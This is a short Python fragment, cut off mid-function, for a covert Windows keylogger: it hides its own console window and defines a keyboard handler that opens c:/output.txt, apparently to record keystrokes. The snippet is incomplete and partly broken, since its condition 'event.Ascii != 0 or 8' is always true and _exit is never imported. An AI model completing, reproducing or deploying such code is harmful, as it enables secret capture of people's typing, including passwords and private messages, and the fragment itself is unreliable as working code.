import win32api
import win32console
import win32gui
import pythoncom

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnKeyboardEvent(event):
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
         file = open('c:/output.txt', 'r+')